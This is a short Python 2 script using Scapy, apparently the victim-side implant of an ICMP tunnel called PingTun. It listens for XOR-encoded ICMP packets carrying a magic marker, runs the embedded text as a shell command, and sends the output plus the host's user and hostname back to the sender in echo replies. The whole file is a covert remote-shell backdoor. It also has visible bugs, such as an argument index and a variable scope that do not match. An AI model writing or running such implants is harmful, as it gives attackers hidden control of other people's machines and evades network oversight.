from scapy.all import *
import sys, time, platform

if len(sys.argv) != 2:
        print "[PingTun] Usage: python2 client.py <interface>"
        print "[PingTun] Exiting..."
        exit()

prompt = ""

if platform.system() == "Windows":
	prompt = "C:\\"
else:
	proc = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE,    
	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	user = proc.stdout.read() + proc.stderr.read()

	proc = subprocess.Popen("hostname", shell=True, stdout=subprocess.PIPE,
	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	host = proc.stdout.read() + proc.stderr.read()
	prompt = ("[" + user + "@" + host + "]").replace("\n", '') 

xor = "\x42\x42\x42\x42"

client_magic = "\xde\xad\xbe\xef"
server_magic = "\xbe\xef\xde\xad"

ping = "\xaa\xab\xac\xad"
port = "\xba\xbb\xbc\xbd"
shell = "\xca\xcb\xcc\xcd"

source = ""

def action(pkt):
	if hasattr(pkt, "load"):
		buff = XOR(pkt.load)

		if buff[0:4] == client_magic:
			source = pkt.src
			if buff[4:8] == ping:
				print "Ping"
			elif buff[4:8] == port:
				print "Port"
			elif buff[4:8] == shell:
				time.sleep(0.1)
				command_shell(buff[8:])
				print "Sending reply"

def packet_builder(data):
	packet = Ether() / IP(dst=source) / ICMP(type=0) / (XOR(server_magic + data))
	return packet

def XOR(p):
        buff = ""
        for i in range(0,len(p)):
                buff += chr(ord(p[i]) ^ ord(xor[i % 4]))
        return buff

def command_shell(data):
	value = ""
	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	value = proc.stdout.read() + proc.stderr.read()
	sendp(packet_builder(shell + value + prompt),verbose=0,iface=sys.argv[2])

sniff(iface=sys.argv[1],filter="icmp",prn=action,store=1)
